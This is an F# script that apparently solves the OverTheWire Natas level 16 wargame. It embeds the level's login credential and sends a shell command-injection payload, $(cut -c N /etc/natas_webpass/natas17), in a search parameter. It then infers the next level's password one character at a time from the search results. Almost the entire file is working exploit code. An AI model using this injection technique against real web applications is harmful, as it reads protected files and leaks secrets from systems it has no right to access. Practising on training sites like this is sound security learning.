open System
open System.Net
open System.IO

let url = "http://natas16.natas.labs.overthewire.org/"
let credentials = "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let candidates index =
    let query = sprintf "%s?needle=$(cut -c%i /etc/natas_webpass/natas17)" url (index + 1)
    let http = HttpWebRequest.CreateHttp query
    http.Headers.Add(basicAuth)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    let html = reader.ReadToEnd ()
    let searchResults = 
        let results = html.Split([|"<pre>";"</pre>"|], StringSplitOptions.None)
        results.[1].Split([|'\r';'\n'|], StringSplitOptions.RemoveEmptyEntries)
    if Array.isEmpty searchResults then [|'0'..'9'|]
    else
        searchResults 
        |> Array.map (fun (s: string) -> s.ToLower() |> Set.ofSeq) 
        |> Array.reduce Set.intersect
        |> Set.toArray
        |> Array.collect (fun c -> [|Char.ToLower c; Char.ToUpper c|])

let firstBlind = [|0..31|] |> Array.map candidates